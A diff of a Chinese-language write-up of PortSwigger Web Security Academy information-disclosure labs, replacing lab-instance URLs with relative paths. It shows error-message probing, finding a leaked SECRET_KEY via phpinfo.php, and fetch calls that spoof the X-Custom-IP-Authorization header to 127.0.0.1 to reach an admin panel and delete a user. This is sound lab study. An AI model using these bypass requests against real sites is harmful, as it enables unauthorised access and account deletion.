@@ -12,7 +12,7 @@ last_update:
 | Document  | https://portswigger.net/web-security/information-disclosure/exploiting#error-messages                 |
 | Lab       | https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-error-messages |
 
-嘗試 https://0af9000b03d382b281d1f77600800031.web-security-academy.net/product?productId=%27
+嘗試 `/product?productId=%27`
 
 ```
 Internal Server Error: java.lang.NumberFormatException: For input string: "'"
@@ -65,7 +65,7 @@ Apache Struts 2 2.3.31
 
 首頁的 HTML 看到 `<!-- <a href=/cgi-bin/phpinfo.php>Debug</a> -->`
 
-訪問 https://0a49004903e723e08188398300630085.web-security-academy.net/cgi-bin/phpinfo.php
+訪問 `/cgi-bin/phpinfo.php`
 
 搜尋 SECRET_KEY，看到 `axkx2kh24eql5x9tbbcrw50j0t0fqp23`，成功解題～
 
@@ -162,7 +162,7 @@ public class ProductTemplate implements Serializable
 
 之前有學過 [Trace HTTP Request Method](../http/http-request-methods-2.md)，沒想到在這個 Lab 真的用上了
 
-嘗試 `TRACE https://0a5a00f004aaa755815f7a68004e002e.web-security-academy.net/my-account`，得到
+嘗試 `TRACE /my-account`，得到
 
 ```
 TRACE /my-account HTTP/1.1
@@ -175,10 +175,9 @@ X-Custom-IP-Authorization: aaa.xxx.yy.zzz
 嘗試在登入情況戳
 
 ```js
-fetch(
-  "https://0a5a00f004aaa755815f7a68004e002e.web-security-academy.net/my-account",
-  { headers: { "X-Custom-IP-Authorization": "127.0.0.1" } },
-);
+fetch(`${location.origin}/my-account`, {
+  headers: { "X-Custom-IP-Authorization": "127.0.0.1" },
+});
 ```
 
 可以看到回傳的 HTML 有 admin panel
@@ -195,10 +194,9 @@ fetch(
 接著嘗試
 
 ```js
-fetch(
-  "https://0a5a00f004aaa755815f7a68004e002e.web-security-academy.net/admin",
-  { headers: { "X-Custom-IP-Authorization": "127.0.0.1" } },
-);
+fetch(`${location.origin}/admin`, {
+  headers: { "X-Custom-IP-Authorization": "127.0.0.1" },
+});
 ```
 
 回傳的 HTML
@@ -213,10 +211,9 @@ fetch(
 接著嘗試
 
 ```js
-fetch(
-  "https://0a5a00f004aaa755815f7a68004e002e.web-security-academy.net/admin/delete?username=carlos",
-  { headers: { "X-Custom-IP-Authorization": "127.0.0.1" } },
-);
+fetch(`${location.origin}/admin/delete?username=carlos`, {
+  headers: { "X-Custom-IP-Authorization": "127.0.0.1" },
+});
 ```
 
 成功解題～
